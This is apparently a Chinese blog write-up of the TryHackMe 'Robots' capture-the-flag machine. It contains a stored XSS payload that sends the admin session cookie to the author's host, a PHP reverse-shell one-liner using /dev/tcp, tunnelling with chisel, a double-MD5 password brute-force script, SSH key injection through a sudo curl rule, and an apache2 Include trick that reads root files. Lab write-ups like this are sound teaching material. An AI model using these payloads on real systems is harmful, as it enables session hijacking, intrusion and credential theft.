{"pageProps":{"postData":{"id":"TryHackMeRobots","contentHtml":"<h1>Robots</h1>\n<blockquote>\n<p><a href=\"https://tryhackme.com/room/robots\">https://tryhackme.com/room/robots</a> | Hard</p>\n</blockquote>\n<p>Notes：A (small) tribute to I. Asimov.</p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">➜  robots nmap -sT -min-rate 5000 -p- 10.10.188.220       \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-26 10:08 EDT\nWarning: 10.10.188.220 giving up on port because retransmission <span class=\"hljs-built_in\">cap</span> hit (10).\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.188.220\nHost is up (0.31s latency).\nNot shown: 64287 closed tcp ports (conn-refused), 1245 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n9000/tcp open  cslistener\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 59.85 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  robots nmap -sT -A -T4 -O -p 22,80,9000 10.10.188.220\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-26 10:10 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.188.220\nHost is up (0.31s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.9p1 (protocol 2.0)\n80/tcp   open  http    Apache httpd 2.4.61\n| http-robots.txt: 3 disallowed entries \n|_/harming/humans /ignoring/human/orders /harm/to/self\n|_http-server-header: Apache/2.4.61 (Debian)\n|_http-title: 403 Forbidden\n9000/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))\n|_http-title: Apache2 Ubuntu Default Page: It works\n|_http-server-header: Apache/2.4.52 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.11 (93%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (<span class=\"hljs-built_in\">test</span> conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: robots.thm\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   311.56 ms 10.21.0.1\n2   311.71 ms 10.10.188.220\n</code></pre>\n<h2>Web渗透</h2>\n<h3>信息收集</h3>\n<p>将 <code>robots.thm</code>写入<code>hosts</code>，因为关卡名字是<code>robots</code> ，故访问一下<code>robots</code>文件</p>\n<pre><code class=\"hljs language-bash\">Disallow: /harming/humans\nDisallow: /ignoring/human/orders\nDisallow: /harm/to/self\n</code></pre>\n<p>其中<code>/harming/humans</code>和<code>/ignoring/human/orders</code> 弹 <code>403</code> ，<code>/harm/to/self</code> 是登录页</p>\n<p><img src=\"/post-images/TryHackMeRobots/image.png\" alt=\"image.png\"></p>\n<p>注册页</p>\n<p><img src=\"/post-images/TryHackMeRobots/image1.png\" alt=\"image.png\"></p>\n<p>注册用户 <code>sunset</code></p>\n<p><img src=\"/post-images/TryHackMeRobots/image2.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">da16e6c8fd634c1062184c03622da91a\n</code></pre>\n<p>登陆进去后的页面</p>\n<p><img src=\"/post-images/TryHackMeRobots/image3.png\" alt=\"image.png\"></p>\n<p>点击左上角的 <code>Server info</code> ,是<code>phpinfo</code>信息</p>\n<p><img src=\"/post-images/TryHackMeRobots/image4.png\" alt=\"image.png\"></p>\n<p>但是在里面能看到登陆后的<code>Cookie</code></p>\n<p><img src=\"/post-images/TryHackMeRobots/image5.png\" alt=\"image.png\"></p>\n<p>继续测试，测试了<code>SQL</code>注入等一系列漏洞后没找到可利用的，然后发现我们的用户名可以在登录后的后台中显示出来</p>\n<p><img src=\"/post-images/TryHackMeRobots/image6.png\" alt=\"image.png\"></p>\n<p>我们尝试测试一下 <code>XSS</code> ，我们注册用户 <code>&#x3C;script>alert(2);&#x3C;/script></code> ，然后进行登录</p>\n<p><img src=\"/post-images/TryHackMeRobots/image7.png\" alt=\"image.png\"></p>\n<p>可以发现代码被触发了，存在存储型<code>XSS</code>漏洞</p>\n<h3>XSS - 窃取管理员 Cookie</h3>\n<p>测试是否出网</p>\n<pre><code class=\"hljs language-bash\">&#x3C;script>location.href=<span class=\"hljs-string\">'http://10.21.192.44/1111'</span>&#x3C;/script>\n</code></pre>\n<p><img src=\"/post-images/TryHackMeRobots/image8.png\" alt=\"image.png\"></p>\n<p>可以，并且能发现服务端（可能注册页面的<code>An admin monitors new users.</code> 有关）会访问我们</p>\n<p>尝试窃取管理员<code>Cookie</code></p>\n<pre><code class=\"hljs language-bash\">&#x3C;script>location.href=<span class=\"hljs-string\">'http://10.21.192.44/Cookie'</span>+document.cookie&#x3C;/script>\n</code></pre>\n<p>发现并没有能接收到<code>Cookie</code> ，发现原来是开启了 <code>HttpOnly</code></p>\n<p><img src=\"/post-images/TryHackMeRobots/image9.png\" alt=\"image.png\"></p>\n<p>但是我们之前在后台页面的<code>Server info</code> 页面中有 <code>Cookie</code> 信息</p>\n<p><img src=\"/post-images/TryHackMeRobots/image5.png\" alt=\"image.png\"></p>\n<p>编写<code>XSS</code>代码用于注册新用户，获取<code>Server info</code> 的内容并返回到我们的服务器中</p>\n<pre><code class=\"hljs language-bash\">&#x3C;script>fetch(<span class=\"hljs-string\">'/harm/to/self/server_info.php'</span>).<span class=\"hljs-keyword\">then</span>(res=>res.text()).<span class=\"hljs-keyword\">then</span>(text=>{location=<span class=\"hljs-string\">'https://10.21.192.44/Cookie?content='</span>+encodeURIComponent(text);});&#x3C;/script>\n</code></pre>\n<p>等待服务器访问，但是出现了问题，请求太大而无法成功将请求发出，修改代码仅抓取 <code>PHPSESSID</code></p>\n<pre><code class=\"hljs language-bash\">&#x3C;script>fetch(<span class=\"hljs-string\">'/harm/to/self/server_info.php'</span>,{credentials:<span class=\"hljs-string\">'include'</span>}).<span class=\"hljs-keyword\">then</span>(res=>res.text()).<span class=\"hljs-keyword\">then</span>(text=>{var m=text.match(/PHPSESSID=[^\\s&#x3C;><span class=\"hljs-string\">\"']+/);if(m)location='http://10.21.192.44/Cookie?content='+encodeURIComponent(m[0]);});&#x3C;/script>\n</span></code></pre>\n<p>再次等待服务器访问</p>\n<p><img src=\"/post-images/TryHackMeRobots/image10.png\" alt=\"image.png\"></p>\n<p>捕获到了服务器传来的请求</p>\n<pre><code class=\"hljs language-bash\">PHPSESSID=lmccs0n6v9oic0kl8iguvlmcuc\n</code></pre>\n<p>替换 <code>Cookie</code> ，刷新页面即可进入到管理员后台</p>\n<p><img src=\"/post-images/TryHackMeRobots/image11.png\" alt=\"image.png\"></p>\n<p>进入后台后发现并没有什么新功能，<code>Fuzz</code> 一下</p>\n<pre><code class=\"hljs language-bash\">➜  robots ffuf -w ../../Dict/SecLists-2024.3/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://robots.thm/harm/to/self/FUZZ.php -fs 662\n\n        /<span class=\"hljs-string\">'___\\  /'</span>___\\           /<span class=\"hljs-string\">'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://robots.thm/harm/to/self/FUZZ.php\n :: Wordlist         : FUZZ: /root/Desktop/Dict/SecLists-2024.3/Discovery/Web-Content/directory-list-2.3-medium.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 662\n________________________________________________\n\nlogin                   [Status: 200, Size: 795, Words: 125, Lines: 36, Duration: 312ms]\nregister                [Status: 200, Size: 976, Words: 155, Lines: 39, Duration: 307ms]\nadmin                   [Status: 200, Size: 370, Words: 29, Lines: 28, Duration: 305ms]\nlogout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 310ms]\nconfig                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 305ms]\n</span></code></pre>\n<p><code>Fuzz</code> 出来 <code>admin.php</code></p>\n<p><img src=\"/post-images/TryHackMeRobots/image12.png\" alt=\"image.png\"></p>\n<h3>文件包含</h3>\n<p>输入管理页面地址 <code>http://robots.thm/harm/to/self/admin.php</code></p>\n<p><img src=\"/post-images/TryHackMeRobots/image13.png\" alt=\"image.png\"></p>\n<p>看输出应该是将其进行包含了，我们再测试一下</p>\n<pre><code class=\"hljs language-bash\">➜  robots <span class=\"hljs-built_in\">cat</span> test.php  \n&#x3C;?php <span class=\"hljs-built_in\">echo</span>(<span class=\"hljs-string\">\"Test Page\"</span>);?>\n</code></pre>\n<p><img src=\"/post-images/TryHackMeRobots/image14.png\" alt=\"image.png\"></p>\n<p>成功包含，我们进行反弹 <code>shell</code></p>\n<pre><code class=\"hljs language-bash\">➜  robots <span class=\"hljs-built_in\">cat</span> shell.php\n&#x3C;?php <span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-string\">\"/bin/bash -c 'bash -i >&#x26; /dev/tcp/10.21.192.44/1234 0>&#x26;1'\"</span>);?>\n</code></pre>\n<p><img src=\"/post-images/TryHackMeRobots/image15.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/TryHackMeRobots/image16.png\" alt=\"image.png\"></p>\n<h2>数据库脱库</h2>\n<p>查看 <code>/etc/passwd</code> 文件，貌似没有可以操作的用户</p>\n<p><img src=\"/post-images/TryHackMeRobots/image17.png\" alt=\"image.png\"></p>\n<p>并且可能是在 <code>Docker</code> 容器中</p>\n<p><img src=\"/post-images/TryHackMeRobots/image18.png\" alt=\"image.png\"></p>\n<p>查看配置文件 <code>config.php</code></p>\n<pre><code class=\"hljs language-bash\">www-data@robots:/var/www/html/harm/to/self$ <span class=\"hljs-built_in\">cat</span> config.php \n&#x3C;?php\n    <span class=\"hljs-variable\">$servername</span> = <span class=\"hljs-string\">\"db\"</span>;\n    <span class=\"hljs-variable\">$username</span> = <span class=\"hljs-string\">\"robots\"</span>;\n    <span class=\"hljs-variable\">$password</span> = <span class=\"hljs-string\">\"q4qCz1OflKvKwK4S\"</span>;\n    <span class=\"hljs-variable\">$dbname</span> = <span class=\"hljs-string\">\"web\"</span>;\n// Get the current hostname\n<span class=\"hljs-variable\">$currentHostname</span> = <span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">'HTTP_HOST'</span>];\n\n// Define the desired hostname\n<span class=\"hljs-variable\">$desiredHostname</span> = <span class=\"hljs-string\">'robots.thm'</span>;\n\n// Check <span class=\"hljs-keyword\">if</span> the current hostname does not match the desired hostname\n<span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$currentHostname</span> !== <span class=\"hljs-variable\">$desiredHostname</span>) {\n    // Redirect to the desired hostname\n    header(<span class=\"hljs-string\">\"Location: http://<span class=\"hljs-variable\">$desiredHostname</span>\"</span> . <span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">'REQUEST_URI'</span>]);\n    <span class=\"hljs-built_in\">exit</span>();\n}\nini_set(<span class=\"hljs-string\">'session.cookie_httponly'</span>, 1);\n\nsession_start();\n\n?>\n</code></pre>\n<h3>失败 - Stowaway backward</h3>\n<p>应该是要进行数据库登录了，但是 <code>shell</code> 中并没有 <code>mysql</code> 的命令，我们要将网络转发出去</p>\n<pre><code class=\"hljs language-bash\">www-data@robots:/tmp$ curl 10.21.192.44/linux_x64_agent --output /tmp/agent\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100 2174k  100 2174k    0     0   528k      0  0:00:04  0:00:04 --:--:--  528k\n</code></pre>\n<pre><code class=\"hljs language-bash\">./linux_x64_admin -l 8000 -s 123\n</code></pre>\n<pre><code class=\"hljs language-bash\">www-data@robots:/tmp$ ./agent -c 10.21.192.44:8000 -s 123 -reconnect 8 &#x26;\n</code></pre>\n<pre><code class=\"hljs language-bash\">(node 0) >> backward 3306 3306\n[*] Trying to ask node to listen on 0.0.0.0:3306......\n[*] Waiting <span class=\"hljs-keyword\">for</span> agent<span class=\"hljs-string\">'s response......\n[*] Backward start successfully!\n</span></code></pre>\n<pre><code class=\"hljs language-bash\">  (node 0) >> socks 8001 admin admin\n[*] Trying to listen on 0.0.0.0:8001......\n[*] Waiting <span class=\"hljs-keyword\">for</span> agent<span class=\"hljs-string\">'s response......\n[*] Socks start successfully!\n</span></code></pre>\n<pre><code class=\"hljs language-bash\">➜  robots proxychains mysql -urobots --protocol=TCP -p\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\nEnter password: \n[proxychains] Strict chain  ...  127.0.0.1:8001  ...  127.0.0.1:3306  ...  OK\nERROR 2013 (HY000): Lost connection to server at <span class=\"hljs-string\">'handshake: reading initial communication packet'</span>, system error: 11\n</code></pre>\n<h3>失败 - Stowaway forward</h3>\n<p>反向不行我们直接转发过来试试</p>\n<pre><code class=\"hljs language-bash\">(node 0) >> forward 3306 127.0.0.1:3306\n[*] Trying to listen on 0.0.0.0:3306......\n[*] Waiting <span class=\"hljs-keyword\">for</span> agent<span class=\"hljs-string\">'s response......\n[*] Forward start successfully!\n</span></code></pre>\n<p>结果是输入密码后直接卡住了</p>\n<pre><code class=\"hljs language-bash\">➜  robots mysql -h 127.0.0.1 --protocol=TCP -urobots -p \n\nEnter password: \n</code></pre>\n<h3>成功 - chisel</h3>\n<p>换一个工具，服务端开启监听</p>\n<pre><code class=\"hljs language-bash\">➜  robots chisel server --reverse --port 2333   \n2025/05/27 00:04:37 server: Reverse tunnelling enabled\n2025/05/27 00:04:37 server: Fingerprint +OtHvMvU87AScwm7Y/c1/NuYSwGo2AypaVI6w47XEJU=\n2025/05/27 00:04:37 server: Listening on http://0.0.0.0:2333\n2025/05/27 00:06:04 server: session#1: tun: proxy#R:3306=>172.18.0.2:3306: Listening\n</code></pre>\n<p>靶机连接，并且转发端口</p>\n<pre><code class=\"hljs language-bash\">www-data@robots:/tmp$ ./chisel client 10.21.192.44:2333 R:3306:172.18.0.2:3306\n2025/05/27 04:06:02 client: Connecting to ws://10.21.192.44:2333\n2025/05/27 04:06:05 client: Connected (Latency 329.446954ms)\n</code></pre>\n<p>数据库连接</p>\n<pre><code class=\"hljs language-bash\">➜  robots mysql -h 127.0.0.1 -urobots -p               \n\nEnter password: \nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection <span class=\"hljs-built_in\">id</span> is 92\nServer version: 11.5.2-MariaDB-ubu2404 mariadb.org binary distribution\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nSupport MariaDB developers by giving a star at https://github.com/MariaDB/server\nType <span class=\"hljs-string\">'help;'</span> or <span class=\"hljs-string\">'\\h'</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">help</span>. Type <span class=\"hljs-string\">'\\c'</span> to clear the current input statement.\n\nMariaDB [(none)]> \n</code></pre>\n<pre><code class=\"hljs language-bash\">MariaDB [web]> <span class=\"hljs-keyword\">select</span> * from <span class=\"hljs-built_in\">users</span>;\n+----+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+---------+\n| <span class=\"hljs-built_in\">id</span> | username                                                                                                                                                                                                                                    | password                         | group   |\n+----+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+---------+\n|  1 | admin                                                                                                                                                                                                                                       | 3e3d6c2d540d49b1a11cf74ac5a37233 | admin   |\n|  2 | rgiskard                                                                                                                                                                                                                                    | dfb35334bf2a1338fa40e5fbb4ae4753 | nologin |\n|  3 | &#x3C;script>fetch(<span class=\"hljs-string\">'/harm/to/self/server_info.php'</span>,{credentials:<span class=\"hljs-string\">'include'</span>}).<span class=\"hljs-keyword\">then</span>(res=>res.text()).<span class=\"hljs-keyword\">then</span>(text=>{var m=text.match(/PHPSESSID=[^\\s&#x3C;><span class=\"hljs-string\">\"']+/);if(m)location='http://10.21.192.44/Cookie?content='+encodeURIComponent(m[0]);});&#x3C;/script> | a978c62e8836b7b79411e4800b19363b | guest   |\n+----+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+---------+\n3 rows in set (0.307 sec)\n</span></code></pre>\n<h3>爆破密码</h3>\n<p>我们知道密码是 <code>username</code>+<code>ddmm</code></p>\n<p>并且在写入数据库时还会进行一次 <code>md5</code> ，所以是双重<code>md5</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-variable\">$stmt</span> = <span class=\"hljs-variable\">$pdo</span>->prepare(<span class=\"hljs-string\">\"INSERT into users (username,password,`group`) values (?,md5(?),'guest')\"</span>);\n</code></pre>\n<p>编写脚本进行爆破</p>\n<pre><code class=\"hljs language-bash\">➜  robots <span class=\"hljs-built_in\">cat</span> pass.py \n<span class=\"hljs-comment\">#!/usr/bin/env python3</span>\n\nimport hashlib\n\ndef md5_hash(text: str) -> str:\n    <span class=\"hljs-built_in\">return</span> hashlib.md5(text.encode()).hexdigest()\n\ndef brute_force(prefix: str, target: str):\n    <span class=\"hljs-keyword\">for</span> day <span class=\"hljs-keyword\">in</span> range(1, 32):\n        <span class=\"hljs-keyword\">for</span> month <span class=\"hljs-keyword\">in</span> range(1, 13):\n            suffix = f<span class=\"hljs-string\">\"{day:02d}{month:02d}\"</span>\n            candidate = prefix + suffix\n            <span class=\"hljs-keyword\">if</span> md5_hash(md5_hash(candidate)) == target:\n                <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"[+] Found: {candidate}\"</span>)\n                <span class=\"hljs-built_in\">return</span> candidate\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"[-] No match found.\"</span>)\n    <span class=\"hljs-built_in\">return</span> None\n\n<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:\n    prefix = <span class=\"hljs-string\">\"rgiskard\"</span>\n    target = <span class=\"hljs-string\">\"dfb35334bf2a1338fa40e5fbb4ae4753\"</span> \n    result = brute_force(prefix, target)\n    <span class=\"hljs-keyword\">if</span> result:\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Success.\"</span>)\n    <span class=\"hljs-keyword\">else</span>:\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed.\"</span>)\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  robots python pass.py\n[+] Found: rgiskard2209\nSuccess.\n</code></pre>\n<p>登录 SSH，意外的失败了</p>\n<pre><code class=\"hljs language-bash\">➜  robots ssh -o IdentitiesOnly=<span class=\"hljs-built_in\">yes</span> -o PubkeyAuthentication=no -o PasswordAuthentication=<span class=\"hljs-built_in\">yes</span> rgsisard@10.10.207.123\n\nrgsikard@10.10.207.123<span class=\"hljs-string\">'s password: \nPermission denied, please try again.\nrgsikard@10.10.207.123'</span>s password: \nReceived disconnect from 10.10.207.123 port 22:2: Too many authentication failures\nDisconnected from 10.10.207.123 port 22\n</code></pre>\n<p>尝试使用 MD5</p>\n<pre><code class=\"hljs language-bash\">➜  robots python pass.py\n[+] Found: rgiskard2209\n[+] MD5: b246f21ff68cae9503ed6d18edd32dae\n[+] DMD5: dfb35334bf2a1338fa40e5fbb4ae4753\nSuccess.\n</code></pre>\n<p>使用密码的<code>hash</code>值可以登录进去</p>\n<pre><code class=\"hljs language-bash\">➜  robots ssh -o IdentitiesOnly=<span class=\"hljs-built_in\">yes</span> -o PubkeyAuthentication=no -o PasswordAuthentication=<span class=\"hljs-built_in\">yes</span> rgiskard@10.10.207.123\n\nrgiskard@10.10.207.123<span class=\"hljs-string\">'s password: \nrgiskard@ubuntu-jammy:~$ \n</span></code></pre>\n<h2>权限提升</h2>\n<h3>To Dolivaw</h3>\n<p>查看 <code>sudo</code> 权限</p>\n<pre><code class=\"hljs language-bash\">rgiskard@ubuntu-jammy:~$ <span class=\"hljs-built_in\">sudo</span> -l\n[<span class=\"hljs-built_in\">sudo</span>] password <span class=\"hljs-keyword\">for</span> rgiskard: \nMatching Defaults entries <span class=\"hljs-keyword\">for</span> rgiskard on ubuntu-jammy:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser rgiskard may run the following commands on ubuntu-jammy:\n    (dolivaw) /usr/bin/curl 127.0.0.1/*\n</code></pre>\n<p>我们可以使用 <code>-o</code> 参数给<code>dolivaw</code>写入我们的公钥</p>\n<p><img src=\"/post-images/TryHackMeRobots/image19.png\" alt=\"image.png\"></p>\n<p>如何通过 <code>curl</code> 写入公钥</p>\n<pre><code class=\"hljs language-bash\">rgiskard@ubuntu-jammy:~$ <span class=\"hljs-built_in\">sudo</span> -u dolivaw /usr/bin/curl 127.0.0.1/ -o /tmp/noting file:///tmp/ssh -o /home/dolivaw/.ssh/authorized_keys\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   274  100   274    0     0   102k      0 --:--:-- --:--:-- --:--:--  133k\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   563  100   563    0     0   847k      0 --:--:-- --:--:-- --:--:--  847k\n</code></pre>\n<p>登录 <code>dolivaw</code> 用户</p>\n<pre><code class=\"hljs language-bash\">➜  robots ssh dolivaw@10.10.207.123   \ndolivaw@ubuntu-jammy:~$ \n</code></pre>\n<h3>To Root</h3>\n<p>查看 <code>sudo</code> 权限</p>\n<pre><code class=\"hljs language-bash\">dolivaw@ubuntu-jammy:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> dolivaw on ubuntu-jammy:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser dolivaw may run the following commands on ubuntu-jammy:\n    (ALL) NOPASSWD: /usr/sbin/apache2\n</code></pre>\n<p>到这里不太会，看了下<code>WP</code> ，可以通过 <code>-c</code> 参数来泄露 <code>flag</code></p>\n<p>首先先注释配置文件的一些配置</p>\n<pre><code class=\"hljs language-bash\">dolivaw@ubuntu-jammy:~$ <span class=\"hljs-built_in\">cp</span> /etc/apache2/apache2.conf /tmp/apache2.conf\n</code></pre>\n<pre><code class=\"hljs language-bash\"> 80 <span class=\"hljs-comment\">#DefaultRuntimeDir ${APACHE_RUN_DIR}</span>\n</code></pre>\n<p>运行<code>apache2</code> 泄露 <code>flag</code></p>\n<pre><code class=\"hljs language-bash\">dolivaw@ubuntu-jammy:~$ <span class=\"hljs-built_in\">sudo</span> /usr/sbin/apache2  -C <span class=\"hljs-string\">\"Include /root/root.txt\"</span>  -f /tmp/apache2.conf -k start\n[Tue May 27 05:24:47.549392 2025] [core:warn] [pid 5096] AH00111: Config variable <span class=\"hljs-variable\">${APACHE_PID_FILE}</span> is not defined\n[Tue May 27 05:24:47.549461 2025] [core:warn] [pid 5096] AH00111: Config variable <span class=\"hljs-variable\">${APACHE_RUN_USER}</span> is not defined\n[Tue May 27 05:24:47.549466 2025] [core:warn] [pid 5096] AH00111: Config variable <span class=\"hljs-variable\">${APACHE_RUN_GROUP}</span> is not defined\n[Tue May 27 05:24:47.549477 2025] [core:warn] [pid 5096] AH00111: Config variable <span class=\"hljs-variable\">${APACHE_LOG_DIR}</span> is not defined\n[Tue May 27 05:24:47.552532 2025] [core:warn] [pid 5096:tid 140527105746816] AH00111: Config variable <span class=\"hljs-variable\">${APACHE_LOG_DIR}</span> is not defined\n[Tue May 27 05:24:47.552716 2025] [core:warn] [pid 5096:tid 140527105746816] AH00111: Config variable <span class=\"hljs-variable\">${APACHE_LOG_DIR}</span> is not defined\n[Tue May 27 05:24:47.552737 2025] [core:warn] [pid 5096:tid 140527105746816] AH00111: Config variable <span class=\"hljs-variable\">${APACHE_LOG_DIR}</span> is not defined\nAH00526: Syntax error on line 1 of /root/root.txt:\nInvalid <span class=\"hljs-built_in\">command</span> <span class=\"hljs-string\">'THM{2a279561f5eea907f7617df3982cee24}'</span>, perhaps misspelled or defined by a module not included <span class=\"hljs-keyword\">in</span> the server configuration\n</code></pre>\n<pre><code class=\"hljs language-bash\">THM{2a279561f5eea907f7617df3982cee24}\n</code></pre>\n<p><code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">dolivaw@ubuntu-jammy:~$ <span class=\"hljs-built_in\">cat</span> user.txt \nTHM{9b17d3c3e86c944c868c57b5a7fa07d8}\n</code></pre>\n<h2>总结</h2>\n<p>很好玩的机器，存储型 XSS 窃取管理员 Cookie。</p>\n<p>也遇到 stowaway 的一些 bug，转发过来的 3306 端口貌似会有问题，通过 chisel 解决。</p>\n<p>最后是学习到本地使用apache2 进行权限提升（任意文件读取），其实有很多方法可以获得<code>root shell</code>的，其中一个文章（<a href=\"https://0xb0b.gitbook.io/writeups/tryhackme/2025/robots#shell-as-root%EF%BC%89%E6%98%AF%E9%80%9A%E8%BF%87%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%85%AC%E9%92%A5%E8%80%8C%E8%8E%B7%E5%BE%97\">https://0xb0b.gitbook.io/writeups/tryhackme/2025/robots#shell-as-root）是通过日志文件写入公钥而获得</a> <code>root shell</code> 。</p>\n<p>以及文章：<a href=\"https://jaxafed.github.io/posts/tryhackme-robots/#unintended-2-rce-with-cgi-scripts\">https://jaxafed.github.io/posts/tryhackme-robots/#unintended-2-rce-with-cgi-scripts</a> ，其中使用 CGI 脚本活得 Docker 组权限，然后再进行权限提升。</p>","title":"TryHackMe - Robots","date":"2025-05-27","updated":"2025-05-27","tags":["TryHackMe","Linux靶机","XSS","Mysql","Apache2","PortForward"],"categories":"靶机","comments":true,"description":"Robots\n\n https://tryhackme.com/room/robots | Hard\n \n\nNotes：A (small) tribute to I. Asimov.\n\n前期踩点\n\n\n\n\n\nWeb渗透\n\n信息收集\n\n将 `robots.thm`写入`hosts`，因为关卡名字是`robots` ，故访问一下`robots`文件\n\n\n\n其中`/harming/humans`和`/ign..."},"recentPosts":[{"id":"HackTheBoxSeason8 - Voleur","title":"HackTheBox - Season8 - Voleur","date":"2025-07-07","isEncrypted":true,"year":"2025","month":"07","day":"07"},{"id":"TryHackMeCreative","title":"TryHackMe - Creative","date":"2025-07-05","isEncrypted":false,"year":"2025","month":"07","day":"05"},{"id":"HackTheBoxSeason8 - RustyKey","title":"HackTheBox - Season8 - RustyKey","date":"2025-06-30","isEncrypted":true,"year":"2025","month":"06","day":"30"},{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Season8 - Artificial","date":"2025-06-28","isEncrypted":true,"year":"2025","month":"06","day":"28"},{"id":"HackTheBoxMachine - Developer","title":"HackTheBox - Machine - Developer","date":"2025-06-22","isEncrypted":false,"year":"2025","month":"06","day":"22"},{"id":"HackTheBoxMachine - TwoMillion","title":"HackTheBox - Machine - TwoMillion","date":"2025-06-21","isEncrypted":false,"year":"2025","month":"06","day":"21"},{"id":"群U靶机Tools","title":"群U靶机 - Tools","date":"2025-06-16","isEncrypted":false,"year":"2025","month":"06","day":"16"}]},"__N_SSG":true}